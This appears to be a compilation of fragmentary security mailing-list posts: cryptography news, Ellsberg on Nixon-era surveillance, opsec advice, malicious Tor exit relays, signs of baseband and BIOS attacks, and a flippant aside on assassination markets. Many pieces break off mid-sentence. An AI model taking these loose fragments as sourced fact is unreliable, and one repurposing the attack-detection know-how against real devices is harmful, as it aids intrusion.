Today I am joining Co3 Systems as its Chief Technology Officer.  I've
been on the company's advisory board for about a year, and was an
informal adviser to CEO John Bruce before that.  John and I worked
together at Counterpane in the early 2000s, and we both think this is
a natural extension to what we tried to build there.  I also know CMO
Ted Julian from his days at   Together, we're going to build
*the* incident response product.
I'm really excited about this -- and the fact that the company
headquarters are just three T stops inbound to Harvard and the Berkman
Center makes it even more perfect.

As one anecdote, when I TAed the MIT Network and Computer security
course, we assigned "Why Johnny Can't Encrypt" as the first reading.
We asked the students to send us a PGP encrypted & signed message and
tell us how long it took.
If I recall correctly, it took an average of 30 minutes for
non-existing users to figure out how to use PGP. Think about that.
These were graduate & upperclass undergraduate computer science
students enrolled in a network security course. Everyone had accounts
on the same university system and were mostly using standalone email
Best of all, someone decided it would be funny to generate a fake key
for me and post it to pgp.mit.edu. Several students fell for the
trick, didn't verify the key, and encrypted their homework with the
wrong key. It was a great way to drive home the lesson, but we asked
the jokers to kindly revoke their key, which they did.
Long story short, PGP was still hard to figure out for an experienced
cohort of users, who didn't have the issues of webmail and
proliferation of mobile platforms we have today. I don't think
anything has improved to make it viable for a wider audience.

the present"
see also: from thread:
When did you first become aware that there had been an attempt to
seize your medical files from Lewis Fielding's office, and what was
your reaction to the administration going that far?
In general, how aware were you of surveillance and character
assassination attempts against your person, such as the attempts to
tie you to communist groups in Minnesota as per this conversation
between Nixon and John Mitchell?
WOW! That link is absolutely fascinating! (Even though I don't have
the time just now to go through it in detail, as I will shortly).
Thank you for the link! I have to ask, where is it from, where did you
get it (on the White House transcripts)?
Well, in answer to your question, I just became aware of some
surveillance on me (BEFORE the Pentagon papers came out) ten minutes
ago, from your link. I was being surveilled because I was a witness in
a criminal trial of draft resisters, some of the Minnesota Eight.
Their very good lawyer has been accused, I don't know on what basis,
of having been a Communist. And that allegation was not of particular
significance to the DOJ UNTIL, months later, he was associated with
me, after the Papers came out. Likewise, the president is heard
discussing with Haldeman on these transcripts the need to go back over
earlier (illegal, warrantless) wiretaps--of journalists and White
House officials, on which I was overheard--to see what might look
significant now, in light of the release of the Pentagon Papers.
That's what I've been talking about in earlier answers: the ability of
the government to go back to taps collected years earlier to look for
material with which to influence potential witnesses in the present.
(See their interest in the allegation that the wife of one journalist
may have been accused of shoplifting in her past). So people who have
"nothing to hide" should ask themselves if that is equally true of
their spouses or children, or neighbors, who could possibly be turned
into informants by threat of their private lives being revealed. (The
Cuban CIA assets who burglarized my psychoanalyst's office were
interested in my children and wife as much as me, a reporter who
interviewed them was told; they had been told of the precedent of
Alger Hiss' step-son who was crucially deterred, at Hiss' insistence,
from testifying in his defense at his trial on a crucial point,
because he would have been questioned about his alleged
My analyst later apologized to me for not telling me about the
break-in--which he was sure was aimed at me, by the White
House--because his lawyer had advised him not to "get involved." So I
didn't know about it until it came out in my courtroom, thanks to John
Dean's revelation. All for the best. If he had told me and we had
raised it in the court-room, the plumbers would not have been kept on
the White House payroll (via CREEP) and would not have been ordered
into the Watergate. Nixon would have stayed in office, and the war
would have continued for years.

@_subject: more NTRU fun: Homomorphic AES Evaluation Using NTRU 
[see pdf for citations / bib]
Fully homomorphic encryption has come a long way in a mere few years
since the first plausibly secure construction was introduced by Gentry
in 2009. This advance settled an open problem posed by Rivest, and
opened the door to many new applications. In a nutshell, by employing
FHE one may perform an arbitrary number of computations directly on
the encrypted data without revealing the secret key. This feature,
makes FHE a powerful tool in multi-party computing and perfectly
suited to protect sensitive data in distributed applications including
those hosted on semi-trusted cloud servers.
The eciency bottleneck that prevents FHE from being deployed in
real-life applications is now being bridged with the introduction of
numerous new optimizations and related proof-of-concept
implementations. The rst implementation of an FHE variant was proposed
by Gentry and Halevi. An impressive array of optimizations were
proposed with the goals of reducing the size of the public-key and
improving the performance of the primitives. Still, encryption of one
bit takes more than a second on a high-end Intel Xeon based server,
while recrypt primitive takes nearly half a minute for the lowest
security setting... a GPU based implementation of the same scheme was
developed which managed to reduce the recryption time to a few
Recently more ecient schemes emerged based on the hardness of
learning with errors (LWE) problem... Brakerski, Gentry, and
Vaikuntanathan (BGV) introduced an LWE based scheme that reduces the
need for bootstrapping. Instead the BGV scheme uses a new lightweight
method, i.e. modulus switching, to mitigate noise growth in
ciphertexts as homomorphic evaluation proceeds. While modulus
switching cannot restore the original level of noise as bootstrapping
does, it still manages to gain exponentially on depth of the circuits
evaluated without aecting the depth of the decryption circuit.
Therefore, as long as we can x the depth of the circuit a priori, we
can perform evaluations without bootstrapping using a leveled
implementation. Smart and Vercauteren presented a number of batching
techniques for packing multiple data streams into a single ciphertext.
Gentry, Halevi and Smart introduced the ﬁrst evaluation of a complex
circuit, i.e. a full AES
block evaluation by using a BGV style scheme introduced earlier by the
same authors. The scheme makes use of batching, key switching and
modulus switching techniques to obtain an eﬃcient leveled
implementation. Three batching techniques are used to obtain
bit–sliced, byte–sliced and SIMD implementations. With 5 minutes per
block evaluation time the byte-sliced implementation is faster, but
also requires less memory. The SIMD implementation takes about 40
minutes per block.
Alt-L´pez, Tromer and Vaikuntanathan (ATV) presented a leveled FHE
scheme based on the modiﬁed NTRU scheme introduced earlier by Stehle
and Steinfeld. A unique aspect of the ATV scheme is that it supports
homomorphic evaluation of ciphertexts encrypted by using public keys
assigned to diﬀerent parties. The authors outline the scheme using a
leveled implementation and introduce a technique called
relinearization to facilitate key switching during the levels of the
evaluation. Modulus switching is also performed after multiplication
and addition operations. The security of ATV scheme relies on two
assumptions: the ring LWE assumption, and the Decisional Small
Polynomial Ratio (DSPR) assumption. The scheme also supports
bootstrapping. While the scheme is appears to be eﬃcient, the analysis
... lacks concrete parameters.
Very recently Bos et al. presented a leveled implementation based on
ATV . The authors modify the proposed scheme in a number of aspects to
build up their own fully homomorphic scheme. The semantic security of
ATV is based on uniformity of the public key which relies on the DSPR
assumption.. the ATV scheme is modiﬁed by adopting a tensor product
technique introduced by Brakerski such that the security depends only
on standard lattice assumptions. Furthermore, modulus–switching is no
longer needed due to the reduced noise growth. Lastly, the authors
improve the ﬂexibility of the scheme by splitting the message using
the Chinese Remainder Theorem and then encrypting them into separate
ciphertexts. This makes integer based arithmetic easier and more
eﬃcient with a cost of a reduction in the depth of circuits that can
be evaluated with the scheme.
Our Contributions. We introduce an implementation of the ATV FHE
scheme along with a number of optimizations. More speciﬁcally we:
• present a batched, bit-sliced implementation of the ATV scheme. The
implementation is generic and is not customized to optimally evaluate
any class of circuits (e.g. AES) more eﬃciently than other.
• resolve the parameter selection issue in the light of recent
theoretical and experimental results in the ﬁeld of lattice reduction.
• introduce a specialization of the rings that simpliﬁes modulus
reduction and allows us to signiﬁcantly reduce the size of the public
key. We show that the impact of this specialization on the key space
is negligibly small. Even further, with the specialization key
switching is no longer needed.
• rigorously analyze the noise growth of the ATV scheme over the
levels of computation, and develop a simple formula for estimating the
number of bits one needs to cut during the modulus reduction step.
• homomorphically evaluate the full 128-bit AES circuit in a
bit-sliced implementation to demonstrate the scalability of the
introduced technique. Our implementation is 5 times faster than the
byte sliced implementation and 43 times faster than the SIMD
implementation of [other FHE...].

indeed, useful as a cost deterrent even if fallible.
and of course, it's fun trying to protect against these attacks (e.g.
playing on "Hard Mode").  for some definition of "fun"...
the short list of mandatory steps to play the game:
- never mess up!  one mistake can be catastrophic. (this means
developing habits)
- source all hardware through retail outlets paid in cash. (avoid
targeted supply chain inserts)
- review all open source components related to key generation,
management, derivation, zeroisation.  or have someone you trust do so.
(see also: crowd funded TrueCrypt audit)  replace unsatisfactory parts
with better ones. (still using my own rngd; so glad to not have to
roll my own FDE boot and key mgmt anymore!)
- use extensive defense in depth.  Virtualization/Qubes, operating
system DACLs, user space separation, network isolation, offline-only
key management, the list is infinite!
- monitor everything: network traffic pre-encryption, running
processes, system calls, event logs, RF signals, sounds, power
consumption, at the highest granularity possible.  analyze what you
monitor for anomalies and failures. (if you aren't watching, you won't
know when you've caught something interesting, and/or need to harden
some first line defenses)
- custom build critical software components: kernel, crypto libs,
secure applications (ssh,openvpn,etc), high risk browsers, email
clients, chat clients, document viewers. (vast majority of exploits
are tailored for common builds - if you build your own with custom
configuration, suites, supported features, exploitation becomes a
tailored and time consuming effort against your specific system)
- employ camouflage to further thwart attempted attacks and increase
the likelihood they'll be detected.  look like WinXP but be a FreeBSD,
claim to be Firefox with plugins such and such while actually running
hardened chromium, spoof versions and platforms, etc. etc.
- employ userspace entropy collection, hardware entropy sources, and
strong entropy mixing across all applications, always! you may need
libc hooking or dalvik interception to make built-in entropy sources
not suck. (e.g. substrate for Android, LD_PRELOAD, etc.)  entropy is a
lucrative target, hard to verify, and often overlooked - make it a
- physical security is paramount: evil maid attacks, covert hw
keyloggers, TEMPEST leaking cables. if they get their hands on it, it
is pwned! (this may cramp your lifestyle)
- operational security: don't even know where to begin with this one.
bonus points for getting the fed chick[0] to take a bowl hit ;)
excellent; i like Python quite a bit for many tasks, and you'll want
to spend a week going through pypy/pip looking at useful modules.
other languages on my short list:
- C/C++ (it's everywhere.  it will remain everywhere.)
- Scheme/Lisp (for the perspective more than utility)
- Ruby/PHP/PERL (good complements to Python. except PHP, which should
be hated and ostracized :)
- Bash/Csh/PowerShell (scripting++)
- Go/C (you're going to want to know these sooner or later)
what would you add, and why?

References: i noticed in the new sigint memo there were a few justifications for
bulk collection:
In particular, when the United States collects nonpublicly available
signals intelligence in bulk, it shall use that data only for the
purposes of detecting and countering:
(1) espionage and other threats and activities directed by foreign
powers or their intelligence services against the United States
and its interests;
(2) threats to the United States and its interests from terrorism;
(3) threats to the United States and its interests from the
development, possession, proliferation, or use of weapons of mass
(4) cybersecurity threats;  [ED: WTF???]
(5) threats to U.S. or allied Armed Forces or other U.S or allied
personnel; and
(6) transnational criminal threats, including illicit finance and
sanctions evasion related to the other purposes named in this section.
half of these could be argued law enforcement domain; why is the power
of the IC applied to potential crimes of "cybersecurity threat",
"transnational criminal threats", and "illicit finance"?
this is looking less like reigning in and more like white wash with
retroactive indemnification...

References: ---------- Forwarded message ----------
since 2004 building my own rngd, my own FDE bootloader, my own
mandatory entropy health watchdog service, in every distribution: none
did FDE key management right (for loop-aes at the time), none did
entropy right.
in 2008 various "expert install" console only options began to support
a suitable FDE solution with luks and boot by volume GUID (rather than
device file).
many years we've had full blown easy (for some degree of easy) FDE
solutions in graphical installers out of the gate. progress!
and yet entropy, the most critical component of any crypto system, is
so horribly and woefully inadequate today. will no indications this
will change soon...
this is not an accident.  :/
yup.  for fun, check out how this setup seeds itself:
srand() and rand() from stdlib (64 bits)
gettid() or pthread_self() (32 bits)
getpid() (32 bits)
Linux-type systems are a little strange in that /dev/random only keeps
about 20 bytes of entropy in reserve. And it takes roughly 20 seconds
for a VPS to collect 8 bytes of entropy, which means asking for 32
bytes of entropy takes an unreasonably long time. By asking for only
20 bytes, most of the requests by this library will complete
immediately. And the remaining 12 bytes are satisfied by
amazingly effective!  BULLRUN FTW
[EDIT: to clarify, i am lamenting the lack of high rate, raw source
physical entropy sources as native instructions in processors.  this
should be a baseline mandatory requirement!  i am also lamenting the
lack of user space entropy daemons and collectors being enabled by
default in most distributions.  i am also lamenting the lack of proper
boot time / VM pass through entropy support in most distributions.  i
am lamenting the lack of any failure handling for entropy in any
distribution, such that a failed RNG condition leads to service halt
rather than blindly carrying on, perhaps for years, unaware that
you're broken. i am also lamenting the lack of serious attention and
thoroughness applied to entropy sources in nearly every computing
system deployed across this planet.  i could go on, but you get the
point... *grin* ]

References: <52DA7D13.4010201
i find these kinds of experiments fascinating
   and would love to see more of them!
---------- Forwarded message ----------
You may have noticed that I, previously known only known under the
pseudonym adrelanos, decided to give up my pseudonymity. It was an
interesting experience to pseudonymously maintain a Linux distribution
(Whonix). I've learned a lot during these ~ 2 years.
I didn't have too bad luck in the lottery of life and are won a
citizenship, which is at low risk compared to less lucky ones. Living in
a country, where pseudonymity for this kind of activity isn't crucial.
Fortunately, according to latest press, neither the US nor Germany are
killing their own citizen for criticizing "the system". That is, the
mass surveillance police state, the military industrial complex, the
system of economy, that needs exponential growth to prevent imploding.
And so it doesn't become even worse, and better for the less lucky ones,
it is important to speak out in public and to take action.
Staying pseudonymous for such a long time became more and more a burden.
For me, it is not healthy for psychology. When pseudonymously working a
a project, you cannot tell anyone about it and they're wondering with
what you never tell much. You need to constantly second guess every tiny
action. Concentrate on not messing up. Also you'll never know if you
already messed up and if "they" already know who you are. You only need
to mess up once, and you're always linked to that project. Lucky me, I
wasn't forced to stay pseudonymous for ever.
I am looking forward to continue contributing to the awesome Free (as in
freedom) Software community. Being no longer pseudonymous allows me to
speak at conferences, to attend key singing parties, to meet up with
other developers, to voice chat with other developers, to chat on IRC
without fear of leaking too much information, to be less paranoid,
sometimes even running searches in clearnet if that is more convenient,
and so forth.

@_subject: cypherpunks buy the farm 
regarding various altcoin pools for various eventualities:
consider a cypherpunk insurance pool with coins allocated fractionally
by some agreed upon method or individual contribution.  in the event
of their untimely demise for any reason, said funds delivered to
designated entity named by prior cryptographic signature (which must
be frequently re-attested).
would it be useful to have a pool for cypherpunks who "buy the farm"?
expenses per "buy the farm" may be as trivial as re-homing your cat
and books, or as extensive as a large family with medical
complications, significant debt obligations, and unexpected costly
events of unplanned nature requiring support decades into the future.
the only restriction which may be advisable is prohibiting the
designated beneficiary from running a death pool against specific or
general groups of individuals.  my distributed graph solver still
crunching, but preliminary results suggest that a critical threshold
of cypherpunks with wills to death pools combined with a specific
trigger set of few otherwise natural deaths multiplies into a
maelstrom of murder; presuming of course that a reasonably robust
death prediction market or assassination market comes into existence
which satisfies the pre-conditions of my computational game theory
model of this multi-party, multi-round stratagem mapped over a
topological isomorphism of the entire set of probabilities for a given
set of initial conditions into a single high order topological
manifold transformation collected in aggregate for an overall motif of
risk...   will advise.

@_subject: cypherpunks buy the farm 
References: The English language contains numerous euphemisms related to dying,
death, burial, and the people and places that deal with death. The
practice of using euphemisms for death is likely to have originated
with the magical belief that to speak the word "death" was to invite
death; where to "draw Death's attention" is the ultimate bad fortune:
a common theory holds that death is a taboo subject in most
English-speaking cultures for precisely this reason...
Someone who has died is said to have passed on, checked out, cashed in
their chips, bit the big one, kicked the bucket, keeled over, bit the
dust, popped their clogs, pegged it, carked it, was snuffed out,
turned their toes up, hopped the twig, bought the farm, got zapped,
written their epitaph, fell off their perch, croaked, gave up the
ghost (originally a more respectful term, cf. the death of Jesus as
translated in the King James Version of the Bible Mark 15:37), gone
south, gone west, gone to California, shuffled off this mortal coil
(from William Shakespeare's Hamlet), run down the curtain and joined
the Choir Invisible, or assumed room temperature (actually a
dysphemism in use among mortuary technicians). When buried, they may
be said to be pushing up daisies, sleeping the big sleep, taking a
dirt nap, gone into the fertilizing business, checking out the grass
from underneath or six feet under.
Euthanasia also attracts euphemisms. One may put one out of one's
misery, put one to sleep, or have one put down, the latter two phrases
being used primarily with dogs, cats, and horses who are being or have
been euthanized by a veterinarian. (These terms are not usually
applied to humans, because both medical ethics and law deprecate
Some euphemisms for killing are neither respectful nor playful, but
instead clinical and detached, including terminate, wet work, to take
care of one, to do them in, tooff, or to take them out. To cut loose
or open up on someone or something means "to shoot at with every
available weapon". Gangland euphemisms for murder includeventilate,
whack, rub out, liquidate, cut down, hit, take him for a ride, string
him up, cut down to size, or "put him in cement boots," "sleep with
the fishes" or "put him in a concrete overcoat," the latter three
implying disposal in deep water, if then alive by drowning; the
arrangement for a killing may be a simple "contract" with the victim
referred to as the "client," which suggests a normal transaction of
One of the most infamous euphemisms in history was the German term
Endlösung der Judenfrage, frequently translated in English as "the
Final Solution of the Jewish Question", a systematic plan for genocide
of the Jews. Even if not associated with the Holocaust, the Nazis used
such terms as Schutzhaft, best translated as "protective custody" for
persons seeking shelter from street violence by Nazi militias, but
such shelter leading quickly to long-term incarceration in a Nazi
prison for political offenders who often got murdered, and
Sonderbehandlung, whose translation "special treatment" implies
privileged protection but in practice meant summary execution. Nazi
officials authorized the disappearance of hostages into 'night and
fog' (Nacht und Nebel) whence few returned. "Charitable Ambulances"
for the buses which took mental patients away to killing centers, and
"Lazarett" (a quarantine clinic for ill travelers) for the

Washington Post Staff Writer
Tuesday, July 8, 2003
Sean Gorman's professor called his dissertation "tedious and
unimportant." Gorman didn't talk about it when he went on dates
because "it was so boring they'd start staring up at the ceiling." But
since the Sept. 11, 2001, attacks, Gorman's work has become so
compelling that companies want to seize it, government officials want
to suppress it, and al Qaeda operatives -- if they could get their
hands on it -- would find a terrorist treasure map.
Tinkering on a laptop, wearing a rumpled T-shirt and a soul patch
goatee, this George Mason University graduate student has mapped every
business and industrial sector in the American economy, layering on
top the fiber-optic network that connects them.
He can click on a bank in Manhattan and see who has communication
lines running into it and where. He can zoom in on Baltimore and find
the choke point for trucking warehouses. He can drill into a cable
trench between Kansas and Colorado and determine how to create the
most havoc with a hedge clipper. Using mathematical formulas, he
probes for critical links, trying to answer the question: "If I were
Osama bin Laden, where would I want to attack?" In the background, he
plays the Beastie Boys.
For this, Gorman has become part of an expanding field of researchers
whose work is coming under scrutiny for national security reasons. His
story illustrates new ripples in the old tension between an open
society and a secure society.
"I'm this grad student," said Gorman, 29, amazed by his transformation
from geek to cybercommando. "Never in my wildest dreams would I have
imagined I'd be briefing government officials and private-sector
Invariably, he said, they suggest his work be classified. "Classify my
dissertation? Crap. Does this mean I have to redo my PhD?" he said.
"They're worried about national security. I'm worried about getting my
degree." For academics, there always has been the imperative to
publish or perish. In Gorman's case, there's a new concern: publish
and perish.
"He should turn it in to his professor, get his grade -- and then they
both should burn it," said Richard Clarke, who until recently was the
White House cyberterrorism chief. "The fiber-optic network is our
country's nervous system." Every fiber, thin as a hair, carries the
impulses responsible for Internet traffic, telephones, cell phones,
military communications, bank transfers, air traffic control, signals
to the power grids and water systems, among other things.
"You don't want to give terrorists a road map to blow that up," he
The Washington Post has agreed not to print the results of Gorman's
research, at the insistence of GMU. Some argue that the critical
targets should be publicized, because it would force the government
and industry to protect them. "It's a tricky balance," said Michael
Vatis, founder and first director of the National Infrastructure
Protection Center. Vatis noted the dangerous time gap between exposing
the weaknesses and patching them: "But I don't think security through
obscurity is a winning strategy."
Gorman compiled his mega-map using publicly available material he
found on the Internet. None of it was classified. His interest in maps
evolved from his childhood, he said, because he "grew up all over the
place." Hunched in the back seat of the family car, he would puzzle
over maps, trying to figure out where they should turn. Five years
ago, he began work on a master's degree in geography. His original
intention was to map the physical infrastructure of the Internet, to
see who was connected, who was not, and to measure its economic
"We just had this research idea, and thought, 'Okay,' " said his
research partner, Laurie Schintler, an assistant professor at GMU. "I
wasn't even thinking about implications."
The implications, however, in the post-Sept. 11 world, were enough to
knock the wind out of John M. Derrick Jr., chairman of the board of
Pepco Holdings Inc., which provides power to 1.8 million customers.
When a reporter showed him sample pages of Gorman's findings, he
exhaled sharply.
"This is why CEOs of major power companies don't sleep well these
days," Derrick said, flattening the pages with his fist. "Why in the
world have we been so stupid as a country to have all this information
in the public domain? Does that openness still make sense? It sure as
hell doesn't to me."
Recently, Derrick received an e-mail from an atlas company offering to
sell him a color-coded map of the United States with all the electric
power generation and transmission systems. He hit the reply button on
his e-mail and typed: "With friends like you, we don't need any
enemies in the world."
Toward the other end of the free speech spectrum are such people as
John Young, a New York architect who created a Web site with a friend,
featuring aerial pictures of nuclear weapons storage areas, military
bases, ports, dams and secret government bunkers, along with driving
directions from Mapquest.com. He has been contacted by the FBI, he
said, but the site is still up.
"It gives us a great thrill," Young said. "If it's banned, it should
be published. We like defying authority as a matter of principle."
This is a time when people are rethinking the idea of innocent
information. But it is hardly the first time a university has
entangled itself in a war. John McCarthy, who oversees Gorman's
project at GMU's National Center for Technology and Law, compared this
period to World War II, when academics worked on code-breaking and
atomic research. McCarthy introduced Gorman to some national security
contacts. Gorman's critical infrastructure project, he said, has
opened a dialogue among academia, the public sector and the private
sector. The challenge? "Getting everyone to trust each other,"
McCarthy said. "It's a three-way tension that tugs and pulls."
When Gorman and Schintler presented their findings to government
officials, McCarthy recalled, "they said, 'Pssh, let's scarf this up
and classify it.' "
And when they presented them at a forum of chief information officers
of the country's largest financial services companies -- clicking on a
single cable running into a Manhattan office, for example, and
revealing the names of 25 telecommunications providers -- the
executives suggested that Gorman and Schintler not be allowed to leave
the building with the laptop.
Businesses are particularly sensitive about such data. They don't want
to lose consumer confidence, don't want to be liable for security
lapses and don't want competitors to know about their weaknesses. The

Greene is trying to help the center get federal funding. ("The

Scientists detect “spoiled onions” trying to sabotage Tor privacy network
Rogue Tor volunteers perform attacks that try to degrade encrypted connections.
 by Dan Goodin - Jan 21 2014, 2:42pm PST
or reason  to crypto end to end...
Computer scientists have identified almost two dozen computers that
were actively working to sabotage the Tor privacy network by carrying
out attacks that can degrade encrypted connections between end users
and the websites or servers they visit.
The "spoiled onions," as the researchers from Karlstad University in
Sweden dubbed the bad actors, were among the 1,000 or so volunteer
computers that typically made up the final nodes that exited the
Tor—short for The Onion Router—network at any given time in recent
months. Because these exit relays act as a bridge between the
encrypted Tor network and the open Internet, the egressing traffic is
decrypted as it leaves. That means operators of these servers can see
traffic as it was sent by the end user. Any data the end user sent
unencrypted, as well as the destinations of servers receiving or
responding to data passed between an end user and server, can be
monitored—and potentially modified—by malicious volunteers. Privacy
advocates have long acknowledged the possibility that the National
Security Agency and spy agencies across the world operate such rogue
exit nodes.
The paper—titled Spoiled Onions: Exposing Malicious Tor Exit Relays—is
among the first to document the existence of exit nodes deliberately
working to tamper with end users' traffic (a paper with similar
findings is here). Still, it remains doubtful that any of the 25
misconfigured or outright malicious servers were operated by NSA
agents. Two of the 25 servers appeared to redirect traffic when end
users attempted to visit pornography sites, leading the researchers to
suspect they were carrying out censorship regimes required by the
countries in which they operated. A third server suffered from what
researchers said was a configuration error in the OpenDNS server.
The remainder carried out so-called man-in-the-middle (MitM) attacks
designed to degrade encrypted Web or SSH traffic to plaintext traffic.
The servers did this by using the well-known sslstrip attack designed
by researcher Moxie Marlinspike or another common MitM technique that
converts unreadable HTTPS traffic into plaintext HTTP. Often, the
attacks involved replacing the valid encryption key certificate with a
forged certificate self-signed by the attacker.
"All the remaining relays engaged in HTTPS and/or SSH MitM attacks,"
researchers Philipp Winter and Stefan Lindskog wrote. "Upon
establishing a connection to the decoy destination, these relays
exchanged the destination's certificate with their own, self-signed
version. Since these certificates were not issued by a trusted
authority contained in TorBrowser's certificate store, a user falling
prey to such a MitM attack would be redirected to the about:certerror
warning page."
The 22 malicious servers were among about 1,000 exit nodes that were
typically available on Tor at any given time over a four-month period.
(The precise number of exit relays regularly changes as some go
offline and others come online.) The researchers found evidence that
19 of the 22 malicious servers were operated by the same person or
group of people. Each of the 19 servers presented forged certificates
containing the same identifying information. The virtually identical
certificate information meant the MitM attacks shared a common origin.
What's more, all the servers used the highly outdated version 0.2.2.37
of Tor, and all but one of the servers were hosted in the network of a
virtual private system providers located in Russia. Several of the IP
addresses were also located in the same net block.
The researchers caution that there's no way to know that the operators
of the malicious exit nodes are the ones carrying out the attacks.
It's possible the actual attacks may be carried out by the ISPs or
network backbone providers that serve the malicious nodes. Still, the
researchers discounted the likelihood of an upstream provider of the
Russian exit relays carrying out the attacks for several reasons. For
one, the relays relied on a diverse set of IP address blocks,
including one based in the US. The relays frequently disappeared after
they were flagged as untrustworthy, researchers also noted.
The researchers identified the rogue volunteers by scanning for server
relays that replaced valid HTTPS certificates with forged ones. That
might have helped to detect certificate forgery attacks such as the
one used in 2011 to monitor 300,000 Gmail users—wouldn't be detected
using the methods devised by the researchers. The researchers don't
believe the malicious nodes they observed were operated by the NSA or
other government agencies.
"Organizations like the NSA have read/write access to large parts of
the Internet backbone," Karlstad University's Winter wrote in an
e-mail. "They simply do not need to run Tor relays. We believe that
the attacks we discovered are mostly done by independent individuals
who want to experiment."
While the confirmation of malicious exit nodes is important, it's not
particularly surprising. Tor officials have long warned that Tor does
nothing to encrypt plaintext communications once it leaves the
network. That means ISPs, remote sites, VPN providers, and the Tor
exit relay itself can all see the communications that aren't encrypted
by end users and the parties they communicate with. Tor officials have
long counseled users to rely on HTTPS, e-mail encryption, or other
methods to ensure that traffic receives end-to-end encryption.
The researchers have proposed a series of updates to the "Torbutton"
software used by most Tor users. Among other things, the
proof-of-concept software fix would use an alternative exit relay to
refetch all self-signed certificates delivered over Tor. The software
would then compare the digital fingerprints of the two certificates.
It's feasible that the changes might one day include certificate
pinning, a technique for ensuring that a certificate presented by
Google, Twitter, and other sites is the one authorized by the operator
rather than a counterfeit one. Several hours after this article went
live, Winter published this blog post titled What the "Spoiled Onions"
paper means for Tor users.

  codermange
many of the best detections for advanced attacks involved not-quite
consumer hardware and customized systems for distributed storage,
observation, and processing.  this is way beyond the budget, skill,
and time afforded even modestly technical users for most intents and
 sometimes simple measures to thwart attacks combined with a keen
situational awareness can identify sophisticated attacks with less
technical means.  anomalies signal to attempt counter measures and
initiate in depth scrutiny.
consider the following,
- baseband attack against mobile target:
 + cannot "hot patch" running image, as some changes take effect
during initialization.  force push results in restart. anomaly  + battery longevity one third what expected, distinct transition
post-baseband-push for longevity of full charge - power consumption
doesn't lie. anomaly  + abnormal signal power level for well known location for cell link.
anomaly  + outbound dial attempts cannot put cell radio into lower bitrate
audio call mode - outbound dial attempts fail - serious anomaly (workaround of making call immediately on boot appears effective, and
keeping a call in voice mode appears to thwart data exfiltation when
no wifi uplink avail.
 + (technical but possible) pushed baseband needs to pass
authentication of image; signature valid, revision same as prior mtd
partition archive version, however sha digests do NOT match! this is
not expected for the same build version. anomaly consider the following,
- BIOS attack with post-boot re-infection vector triggered once
graphics mode transitions from console to graphical display:
 + target hardware is a match and supported, however, root file system
is XFS, ZFS, or other unsupported *nix variant.  attempt to persist by
injection on file system using kernel fs funcs and data structures
(this gets around FDE by interacting before
luks/mdcrypt/loopaes/cryptoloop layer) thus causes kernel panic.
anomaly  [note: A for effort++ by setting a not-again flag after first
attempt.  this prevents the kernel panic from becoming a persistent
DoS as the next boot attempt will complete normally into graphical
desktop.  Subsequent reactivation follows similar fail safe of next
boot succeeding after post boot persistent hook failure and kernel
consider the following,
- SMS MitM attack against Android mobile target:
 + normal delivery of SMS using a client such as TextSecure that
checks for delivery confirmation on SMS, (do NOT use fire-and-forget
like majority of text clients).  attack introduces latency on
confirmation due to radio mode switching between high rate exfiltation
mode and low rate SMS with additional MitM proxy processing latency
added as well. this results in messages initially showing "Message
delivery failed" before shortly then confirming successful
transmisssion. anomaly + abnormal signal power level for well known location for cell link. anomaly

i would agree, and i would also show some sympathy towards the
unsuspecting.  anything cypherpunks can do to ensure end to end crypto

as stated earlier, you can use technical means to monitor at this level.
software defined radio with the right decoding, good position, proper
antennas can obtain full bits.  even without specific decoding,
measuring signal levels at various frequencies compared to baseline is
also useful.  and of course, you can always improve decoding after the
directly accessing flash storage and comparing firmware images in a
way otherwise not possible.
instrumenting and modifying software to verbosely report on anomalies
and make it likely attempted attacks will fail unsuccessfully. (see
also camouflage)
the list goes on and on and on,
help fix vulnerability?  i am sympathetic to your intent, but these
exploits are the product of a large, well funded process.  they take
advantage of positioning in the middle, or next to your endpoint.
they're churned out like an assembly line.  "saving evidence to fix"
is like asking for a digest to add to your antivirus blacklist...
in this model, success is measured by doing less badly.  not by
protecting or fixing.
i have alluded to this before:  multiple constraints limit what i can
disclose, and those groups are not likely to be helpful in specific
general efforts to eliminate public funding for CNE would be useful, however!

fair enough; my position is that this is insufficient and passes the buck.
many don't agree.
said another way: security is everyone's responsibility!
 everyone should encourage and enforce strong defaults, strong suites,
and accept no less.
(i pay bribes in bitcoin to adopt this position ;)
this is better; although perhaps more cumbersome key management wise.
good key management always cumbersome it seems!
absolutely better than storing hashed passwords.  how many people
generate long, random, unique passwords for every site?
GNet NS is locally scoped to each peer as of my understanding, so not
quite a strong global unique naming scheme.  i do believe on further

@_subject: Fwd: [Dailydave] Understanding BIOS & SMM 
References: ---------- Forwarded message ----------
Our research team at MITRE has been looking into BIOS security for the
past couple years and starting to publish our results in the last
year. We described BIOS exploits and an in-BIOS defensive system
called BIOS Chronomancy at venues like BlackHat and ACM CCS. We also
released a free tool called Copernicus[1] which lets you detect if a
BIOS is writable, and dump the contents of the BIOS from a Windows
system (which makes enterprise-wide configuration and integrity
checking possible.)
But the question is, let's say you have a BIOS dump and it shows
differences. How are you going to interpret those differences? How do
you distinguish natural changes from malicious ones? We wanted to get
a basic inspection capability out there, but we recognized that people
were going to need to know a lot more about system internals, hardware
quirks, and UEFI before they'd be able to make full use of it. So we
made a class to help bootstrap people faster. Currently the class is
scheduled for CanSecWest[2] and Syscan[3] (and the prices are going up
starting Feb 1).
It would be nice if people wanted to understand how the deep system
architecture worked for it's own sake, because we of course think it's
super interesting and fulfilling to know things others don't. But
hopefully the news of the past couple months has made people realize
that "out of sight, out of mind" isn't a great strategy for BIOS
security. First there was  (which was kicked off by Dragos
experimenting with Copernicus[4]). Then there was NSA's defensive side
saying they had caught the Chinese making BIOS bricking attacks[5].
Then there was NSA's offensive side being caught having their own BIOS
backdoor capabilities[6]. And of course there were a whole lot of
people letting their FUD flags fly around all of it.
So if you'd like to get a more technical and quantitative view of what
the BIOS/SMM security landscape looks like, you should check out our
classes and watch for talks by Corey Kallenberg, John Butterworth, and
myself over the next 6 months where we'll be describing 2 new BIOS
memory-corruption-to-reflash exploits, 2 new SecureBoot-breaking
tricks, and trustworthy computing extensions to Copernicus that will
counter many classes of attacks against BIOS dumping software that
would let an attacker hide his BIOS presence.

Frustrated by technically savvy privacy extremists using encryption to
protect confidentiality of their data, the United States is preparing
a particularly clever ruse to rummage through your digital detritus.
The US announced new security measures last week, apparently in
response to a terror threat, but gave hints that multiple privacy
enhancing technology conferences  occurring this summer were of the
utmost interest.
Analysts say the changes have been couched in a conceit made to appear
to be in response to intelligence that Islamic militants in Syria and
Yemen developing bombs that could evade airport security.
